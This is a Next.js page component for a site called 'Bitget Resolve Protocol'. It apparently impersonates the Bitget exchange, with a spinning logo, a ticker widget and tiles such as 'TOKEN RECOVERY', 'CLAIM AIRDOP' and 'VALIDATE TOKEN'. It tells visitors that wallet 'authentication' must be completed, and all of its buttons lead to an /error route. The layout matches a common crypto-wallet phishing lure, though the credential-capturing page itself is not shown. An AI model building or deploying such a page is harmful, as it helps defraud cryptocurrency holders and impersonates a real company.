/* eslint-disable @next/next/no-img-element */
'use client'
import Image from "next/image";
import { useEffect, useState } from "react";
import styles from "./Home.module.css"; // Import CSS module for styling


export default function Home() {


  const [loading, setLoading] = useState(true);

  useEffect(() => {
    // Set a timer for 5 seconds
    const timer = setTimeout(() => {
      setLoading(false); // Hide the loading screen after 5 seconds
    }, 2000);

    // Clear the timer when the component unmounts or when the loading state changes
    return () => clearTimeout(timer);
  }, []); // Run this effect only once when the component mounts


  const fadeInClass = loading ? styles.fadeOut : styles.fadeIn; // Conditional class based on loading state

  const data = [
    {
      
      icon : '/rectification.png',
      text : 'BUY TOKEN'
    },
    {
      
      icon : '/tick.png',
      text : 'EARN BWB POINTS'
    },
    {
      
      icon : '/data-recovery.png',
      text : 'SWAPPING FAILED'
    },
    {
      
      icon : '/money.png',
      text : 'TOKEN RECOVERY'
    },
    {
      
      icon : '/stake.png',
      text : 'SWAPPING NOT COMPLETED'
    },
    {  
      icon : '/holding-wrench.png',
      text : 'WITHDRAWAL ISSUES'
    }, 
    {
      icon : '/nft.png',
      text : 'CLAIM AIRDOP'
    },
    {
      icon : '/exchange.png',
      text : 'VALIDATE TOKEN'
    },
    {
      icon : '/holding-wrench.png',
      text : 'MIGRATE BWN'
    },
   
    
  ]
  return (
    <>
    {loading ? (
      // Loading screen markup
      <div className="bg-[rgb(4,30,55)] flex justify-center items-center w-screen h-screen">
      <img src="/bitget.png" alt="loading" className="animate-spin-slow" />
     </div>

    ) : ( 
      <main >
      
      <div style={{backgroundImage:'url(bg_page_title.png)', backgroundSize:'auto 100%', backgroundPosition:'top right'}} className="w-full  pb-10 min-h-[320px] border-[#282E3B]">

      <div className="h-[62px] bg-[#1D2330] overflow-hidden box-border border-1 ">
          <div className="">
          <iframe src="https://widget.coinlib.io/widget?type=horizontal_v2&amp;theme=dark&amp;pref_coin_id=1505&amp;invert_hover=" width="100%" height="36px" ></iframe>
          </div>
      </div>


    <div className="px-5">
      <div className="flex justify-center items-center my-5">
        <img src="/bitget.png" width="80px" height="80px" alt="  DEFI PROTOCOL"/>

      </div>
                   

        <h1 className="text-[#fff] font-[500] text-[20px] md:text-[40px] font-[sans-serif] text-center">BITGET RESOLVE PROTOCOL </h1>

        <p className="text-center text-white">AUTHENTICATION </p>

        <div className="h-2 bg-[#e9d16f] mt-5 mb-6"></div>


                     

      <div className="md:text-center"><a href="/error" className="bg-[rgb(4,30,55)] text-white border border-white rounded-full shadow-md py-3 px-7"> RESOLVE </a></div>


    </div>

       
                     

       

       
     
       
      </div>
<section className=" container mx-auto mt-5 px-10">

  <div className="">
    <p className="lement_p text-center">Bitget Resolve Protocol is a decentralized platform and network that blends Blockchain with DeFi, incorporating Blockchain aspects such as non-custodial management, Micropools, rapid liquidity, and decentralized governance. Each procedure must be completed in its entirety.
      <br/> <b>The authentication of wallet will be finished as follows</b>.
    </p>
  </div>

</section>


<section className=" container mx-auto mt-[4rem] px-10 ">
  <div className=" grid grid-cols-1 md:grid-cols-3 gap-8">
    {data.map((item, index) => (
      <div key={index} className=" py-10 flex justify-center items-center flex-col gap-5 bg-[rgb(4,30,55)]">
        <img className=" max-h-[80px]" src={item.icon} alt={item.text} />

        <h2 className="text-white text-[20px] font-[500]">{item.text}</h2>

        <a 
        href="/error"
        className=" bg-white text-[15px] w-[170px] rounded-full text-center py-[10px] font-semibold"
        >CHOOSE</a>
      </div>
    ))}
  </div>
</section>


<section className="bg-[rgb(4,30,55)] grid grid-cols-1 md:grid-cols-2 p-10 md:px-28 mt-10 items-center">

  <div className="flex justify-center items-center mb-10">
    <img alt="ser_icon" src="/ser_icon_1.png" className="w-[50%]"/>
  </div>
  
  <div>
    <h2 className="text-white font-[600] text-center text-[40px] mb-8">Everything You Need</h2>

    <p className="text-white font-[400] text-center">Bitget Cryptocurrency wallets provide users with a digital solution for storing and managing blockchain assets and cryptocurrencies. These wallets allow users to spend, receive, and trade cryptocurrencies.</p>
  </div>

</section>


<section className="bg-[#e9d16f] w-full text-center py-4">
Copyright @2024 Bitget Resolve Protocol
</section>






    </main>
    )}
    
    </>
  );
}


